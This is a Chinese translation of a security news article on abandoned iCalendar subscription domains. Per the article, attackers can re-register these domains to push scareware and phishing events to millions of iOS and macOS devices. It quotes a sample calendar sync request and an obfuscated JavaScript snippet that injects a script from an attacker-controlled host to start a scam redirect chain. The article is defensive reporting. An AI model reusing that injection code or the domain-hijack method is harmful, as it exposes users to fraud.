---
title: 逾390个被弃用的iCalendar同步域名存在安全隐患，可能导致近400万台设备暴露于安全风险之下
url: https://www.anquanke.com/post/id/313462
source: 安全客-有思想的安全新媒体
date: 2025-11-28
fetch_date: 2025-11-29T03:11:23.302460
---

# 逾390个被弃用的iCalendar同步域名存在安全隐患，可能导致近400万台设备暴露于安全风险之下

首页

阅读

* [安全资讯](https://www.anquanke.com/news)
* [安全知识](https://www.anquanke.com/knowledge)
* [安全工具](https://www.anquanke.com/tool)

活动

社区

学院

安全导航

内容精选

* [专栏](/column/index.html)
* [精选专题](https://www.anquanke.com/subject-list)
* [安全KER季刊](https://www.anquanke.com/discovery)
* [360网络安全周报](https://www.anquanke.com/week-list)

# 逾390个被弃用的iCalendar同步域名存在安全隐患，可能导致近400万台设备暴露于安全风险之下

阅读量**12382**

发布时间 : 2025-11-28 18:02:37

**x**

##### 译文声明

本文是翻译文章，文章原作者 Tushar Subhra Dutta，文章来源：cybersecuritynews

原文地址：<https://cybersecuritynews.com/over-390-abandoned-icalendar-sync-domains-could-expose/>

译文仅供参考，具体内容表达以及含义原文为准。

![]()

数字日历已成为管理个人和工作日程的必备工具。用户常订阅外部日历（如公共假期、体育赛程或社区活动）以保持日程更新。

这些订阅虽带来便利，却在用户设备与外部服务器间建立了 **持久连接**。若托管日历的域名被遗弃并过期，将暴露出严重漏洞：网络犯罪分子可重新注册这些过期域名，**劫持原订阅建立的信任关系**。

这种攻击向量尤为隐蔽——受害者无需执行任何操作，其设备会持续向已被恶意控制的域名发送 **后台同步请求**。

攻击者可通过日历界面直接推送多种威胁，从模仿系统安全警报的 **恐吓软件（scareware）** 到伪装成独家优惠的钓鱼链接。该方法绕过传统邮件过滤器，利用用户对个人规划工具的 **固有信任** 传递恶意 payload。

Bitsight 安全分析师在调查一个分发假日活动的可疑域名时发现了这一新兴威胁。深入分析显示，超过 **390 个废弃域名** 组成的网络正持续接收同步请求，且这些域名每天与约 **400 万唯一 IP 地址**（主要来自 iOS 和 macOS 设备）通信。这一规模表明，一个简单的域名注册失效即可在用户毫不知情的情况下使数百万人面临风险。

![]()

### 同步流量技术分析

研究揭示了促成此类攻击的特定技术模式：

* **HTTP 请求特征**：`Accept` 头表明设备可解析日历文件，`User-Agent` 字符串含守护进程标识符（如 `dataaccessd/1.0`），明确标识为 iOS 日历系统的后台进程（非用户主动浏览器访问）。

![]()

```
GET /[URI]
Host: [Target_Domain]
User-Agent: iOS/17.5.1 (21F90) dataaccessd/1.0
Accept: text/calendar
```

![]()

* **恶意流量类型**：分为 Base64 编码 URI 和 Webcal 查询请求。活跃域名返回的 `.ics` 文件可包含篡改的事件数据。
* **混淆脚本执行**：底层基础设施常使用高度混淆的 JavaScript 进行深度入侵。例如，以下代码片段动态注入页面 DOM 以启动重定向链：

```
_0x407c32.src  = "https://render.linetowaystrue.com/jRQxhz";
if (document.currentScript)  {
document.currentScript.parentNode.insertBefore(_0x407c32,  document.currentScript);
}
```

反混淆后可见，该脚本用于加载更多恶意内容，通常引导用户进入诈骗页面。

理解这些流量特征和脚本行为有助于安全人员更好地识别并阻断这一隐蔽攻击向量。

本文翻译自cybersecuritynews [原文链接](https://cybersecuritynews.com/over-390-abandoned-icalendar-sync-domains-could-expose/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由**安全客**原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处： [https://www.anquanke.com/post/id/313462](/post/id/313462)

安全KER - 有思想的安全新媒体

本文转载自: [cybersecuritynews](https://cybersecuritynews.com/over-390-abandoned-icalendar-sync-domains-could-expose/)

如若转载,请注明出处： <https://cybersecuritynews.com/over-390-abandoned-icalendar-sync-domains-could-expose/>

安全KER - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

* [安全资讯](/tag/%E5%AE%89%E5%85%A8%E8%B5%84%E8%AE%AF)
* [网络攻击](/tag/%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB)

**+1**0赞

收藏

![](https://p5.ssl.qhimg.com/t010857340ce46bb672.jpg)安全客

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

## 发表评论

您还未登录，请先登录。

[登录](/login/index.html)

![](https://p4.ssl.qhimg.com/t014757b72460d855bf.png)

[![](https://p5.ssl.qhimg.com/t010857340ce46bb672.jpg)](/member.html?memberId=171771)

[安全客](/member.html?memberId=171771)

这个人太懒了，签名都懒得写一个

* 文章
* **750**

* 粉丝
* **6**

### TA的文章

* ##### [大规模npm供应链攻击“亡命开关”正驱动恶意软件攻击，其持久化机制依赖特定激活条件](/post/id/313473)

  2025-11-28 18:08:08
* ##### [GitLab发布安全更新，修复可导致认证绕过与拒绝服务攻击的多重漏洞](/post/id/313477)

  2025-11-28 18:07:38
* ##### [Apache SkyWalking 中存在漏洞，可导致攻击者发起跨站脚本攻击](/post/id/313482)

  2025-11-28 18:07:08
* ##### [Next.js服务器存在未授权拒绝服务漏洞，单次请求即可致服务崩溃](/post/id/313486)

  2025-11-28 18:05:53
* ##### [高级威胁“Shai Hulud”升级至v2版本，利用GitHub Actions工作流作为攻击载体窃取敏感机密](/post/id/313468)

  2025-11-28 18:04:22

### 相关文章

* ##### [大规模npm供应链攻击“亡命开关”正驱动恶意软件攻击，其持久化机制依赖特定激活条件](/post/id/313473)

  2025-11-28 18:08:08
* ##### [GitLab发布安全更新，修复可导致认证绕过与拒绝服务攻击的多重漏洞](/post/id/313477)

  2025-11-28 18:07:38
* ##### [Apache SkyWalking 中存在漏洞，可导致攻击者发起跨站脚本攻击](/post/id/313482)

  2025-11-28 18:07:08
* ##### [Next.js服务器存在未授权拒绝服务漏洞，单次请求即可致服务崩溃](/post/id/313486)

  2025-11-28 18:05:53
* ##### [高级威胁“Shai Hulud”升级至v2版本，利用GitHub Actions工作流作为攻击载体窃取敏感机密](/post/id/313468)

  2025-11-28 18:04:22
* ##### [纳闽再保险启用绿色数据中心，实现效能提升与运营成本优化](/post/id/313459)

  2025-11-28 18:00:45
* ##### [遗留Python包中的代码漏洞，可通过劫持其依赖域名进而危及整个PyPI软件生态](/post/id/313453)

  2025-11-28 18:00:14

### 热门推荐

文章目录

![](https://p0.qhimg.com/t11098f6bcd5614af4bf21ef9b5.png)

安全KER

* [关于我们](/about)
* [联系我们](/note/contact)
* [用户协议](/note/protocol)
* [隐私协议](/note/privacy)

商务合作

* [合作内容](/note/business)
* [联系方式](/note/contact)
* [友情链接](/link)

内容需知

* [投稿须知](https://www.anquanke.com/contribute/tips)
* [转载须知](/note/repost)
* 官网QQ群：568681302

合作单位

* [![安全KER](https://p0.ssl.qhimg.com/t01592a959354157bc0.png)](http://www.cert.org.cn/)
* [![安全KER](https://p0.ssl.qhimg.com/t014f76fcea94035e47.png)](http://www.cnnvd.org.cn/)

Copyright © 北京奇虎科技有限公司 三六零数字安全科技集团有限公司 安全KER All Rights Reserved [京ICP备08010314号-66](https://beian.miit.gov.cn/)[![](https://icon.cnzz.com/img/pic.gif)](https://www.cnzz.com/stat/website.php?web_id=1271278035 "站长统计")

微信二维码

**X**![安全KER](https://p0.ssl.qhimg.com/t0151209205b47f2270.jpg)